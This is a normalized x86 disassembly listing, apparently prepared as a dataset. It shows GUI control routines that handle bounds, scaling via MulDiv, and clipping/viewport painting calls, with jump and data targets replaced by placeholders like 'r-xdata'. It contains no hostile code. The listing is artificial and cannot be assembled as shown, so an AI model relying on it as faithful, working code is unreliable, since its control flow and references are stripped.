cmp eax [ esi + 0x44 ]
jne r-xdata
mov eax [ esi + 0x194 ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ esi + 0x198 ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_48d04c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebx + 0x68 ]
call sub_4481b0
xor eax eax
mov [ ebx + 0x68 ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x68 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_49076c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4483f8
mov edx ebx
mov eax edi
call sub_42e354
mov eax ebx
mov si 0xffda
call sub_4483f8
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x68 ] eax
pop edi
pop esi
pop ebx
retn
sub_48d0e0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_48e438
sub_48d154
push esi
push edi
push ebp
mov edi edx
mov esi eax
or [ esi + 0x54 ] 0x8
mov ebp [ edi + 0x2c ]
mov eax ebp
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_42e708
and [ esi + 0x54 ] 0xfff7
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx ebp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop ebp
pop edi
pop esi
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax esi
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax esi
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax esi
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax esi
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax esi
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb050
mov eax esi
call sub_48f2b0
sub_48d1f8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42e5b0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_48df44
jmp r-xdata
cmp edi [ esi + 0x90 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_48d04c
jmp r-xdata
cmp edi [ esi + 0x164 ]
jne r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x164 ] eax
sub_48d260
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
movzx eax [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x58 ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
movzx eax bl
movzx edx [ eax + rw-data ]
mov eax edi
call sub_48cfac
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
movzx eax [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
movzx eax [ esp ]
test al al
je r-xdata
mov eax edi
mov si 0xffee
call sub_4483f8
test bl bl
jne r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x194 ]
push eax
mov eax [ edi + 0x198 ]
push eax
mov ecx [ edi + 0x190 ]
mov edx [ edi + 0x18c ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax ebx
test al al
je r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_48d348
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax esi
call sub_48fdbc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ebx [ esi + 0x40 ]
jne r-xdata
xor ecx ecx
movzx edx [ esi + 0x57 ]
mov eax esi
call sub_48e438
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4c ] eax
mov eax esi
call sub_48d40c
mov eax esi
call sub_490e18
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax esi
call sub_48f2b0
mov eax esi
mov edx [ eax ]
call [ edx + 0x58 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
cmp edi [ esi + 0x44 ]
jne r-xdata
mov eax esi
mov si 0xffd0
call sub_4483f8
mov eax [ ebp + 0xc ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_48d3e8
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_48f2e4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_48f2b0
pop ebx
retn
sub_48d40c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x170 ] 0x0
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx ebx [ esi + 0x61 ]
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
add edi eax
push edi
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add edi eax
mov eax edi
lea ecx [ esp + 0x4 ]
pop edx
call sub_432a5c
mov eax [ esp ]
mov [ esi + 0x17c ] eax
mov eax [ esp + 0x4 ]
mov [ esi + 0x180 ] eax
movzx eax [ r-xdata ]
cmp al bl
jne r-xdata
adc eax 0x0
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x184 ] eax
xor eax eax
mov [ esi + 0x188 ] eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add edi eax
mov [ esi + 0x174 ] edi
adc eax 0x0
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x174 ] eax
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x174 ] eax
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add ebx eax
mov [ esi + 0x178 ] ebx
adc eax 0x0
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x178 ] eax
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x178 ] eax
jmp r-xdata
lea ecx [ esi + 0x184 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xd4 ]
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
sub_48d590
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x88 ] 0x1
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov [ ebx + 0x18c ] eax
sub_48d5c4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx edx
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x88 ] 0x2
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x44 ]
mov [ ebx + 0x190 ] eax
sub_48d5f8
push ebx
push esi
mov ebx eax
push edx
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x88 ] 0x4
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x194 ] eax
sub_48d62c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
push edx
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x88 ] 0x8
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x198 ] eax
sub_48d660
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x90 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_48d77d
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe5
call sub_4483f8
test ebx ebx
je r-xdata
cmp [ eax + 0x1bc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48d784
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x1bc ]
mov edx [ ebp - 0x4 ]
call sub_4248a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
call sub_42e594
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x90 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x90 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x1bc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbe
call sub_4483f8
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc4
call sub_4483f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
call sub_42e354
jmp r-xdata
mov eax [ ebx + 0x1bc ]
mov edx [ ebp - 0x4 ]
call sub_424590
sub_48d78c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
cmp ebx [ esi + 0x30 ]
je r-xdata
xor ecx ecx
movzx edx [ esi + 0x57 ]
mov eax esi
call sub_48e438
mov edx edi
mov eax esi
call sub_48d83c
mov edx edi
mov eax esi
call sub_48f3a8
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_48d7f8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x15c ]
mov edx esi
call sub_449d2c
pop esi
pop ebx
retn
mov [ ebx + 0x158 ] 0x0
sub_48d83c
push ebx
push esi
push edi
mov ecx [ edx + 0x8 ]
mov esi [ edx ]
sub ecx esi
push ecx
mov ecx [ edx + 0xc ]
mov edi [ edx + 0x4 ]
sub ecx edi
push ecx
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
retn
sub_48d890
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_48d8bc
mov edx eax
mov ecx esp
mov eax esi
call sub_432a5c
mov edx esp
mov eax ebx
call sub_48de1c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_48d8d4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_48d878
mov ecx esp
mov edx esi
call sub_432a5c
mov edx esp
mov eax ebx
call sub_48de1c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_48d8fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48d97d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48d984
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
sub_48d98c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_48d9b8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x70 ]
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_48c7f8
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_48c7f8
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_48c7f8
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_48c7f8
sub_48da3c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x74 ]
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_49c74c
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_49c74c
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_49c74c
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_49c74c
sub_48dac0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_48daec
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_47c384
sub_48db1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_48f2b0
sub_48db98
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
movzx eax [ r-xdata ]
mov [ esi + 0x88 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
movzx ebx [ r-xdata ]
movzx ebx [ esi + 0x88 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x184 ]
push eax
call MulDiv
mov [ esi + 0x184 ] eax
test bl 0x2
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x188 ]
push eax
call MulDiv
mov [ esi + 0x188 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x4c ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
je r-xdata
test bl 0x10
je r-xdata
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_48d9b8
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_48da3c
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x64 ]
mov eax ebx
call sub_46d920
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_46d93c
sub_48dd78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_48de0e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_42e800
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_48df68
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call j_sub_44a294
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48de15
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_48dfa0
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_48de1c
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_48de64
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
test esi esi
je r-xdata
mov edx ebx
call sub_49245c
mov edx ebx
mov eax esi
call sub_49234c
mov eax ebx
call sub_48d40c
sub_48deb0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffce
call sub_4483f8
mov [ edi + 0x57 ] bl
push 0x0
movzx ecx bl
mov edx 0xb00b
mov eax edi
call sub_48f2b0
mov eax edi
mov edx [ eax ]
call [ edx + 0x58 ]
sub_48df44
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4684c4
mov edx ebx
mov eax esi
call sub_42e354
sub_48df68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_48df00
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_449e68
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_449db8
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax esi
call sub_48df10
sub_48dfa0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48dff5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48df68
mov eax [ ebp - 0x4 ]
mov edx esi
call j_sub_44a294
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48dffc
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax esi
call sub_449db8
mov edx eax
mov eax ebx
call sub_48d3e8
sub_48e020
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x64 ]
call sub_46d830
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_48f2b0
pop ebx
retn
or [ ebx + 0x88 ] 0x10
mov eax [ ebx + 0x64 ]
call sub_46d830
mov [ ebx + 0x84 ] eax
sub_48e120
push ebx
mov ebx eax
cmp edx [ ebx + 0x6c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x6c ] edx
mov [ ebx + 0x5a ] 0x0
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00d
mov eax ebx
call sub_48f2b0
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_48e1e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_48e1d8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_48ac58
mov eax esi
call sub_48ac58
jmp r-xdata
sub_48e224
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x1d4 ]
mov edx ebx
call sub_424744
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x1d4 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4245dc
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1d4 ]
mov ecx ebx
mov edx esi
call sub_424768
mov cl 0x1
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_48e438
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_477038
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4483f8
sub_48e2ac
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_48e224
mov edx [ ecx + 0x1d4 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_48e224
jmp r-xdata
sub_48e2d0
push ebx
mov ebx eax
mov [ ebx + 0x164 ] edx
test edx edx
je r-xdata
cmp [ ebx + 0x168 ] 0x0
je r-xdata
mov eax edx
mov edx ebx
call sub_42e354
pop ebx
retn
mov eax ebx
call sub_48f30c
cmp eax [ ebx + 0x164 ]
je r-xdata
mov [ ebx + 0x168 ] 0x0
sub_48e308
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_48e39e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
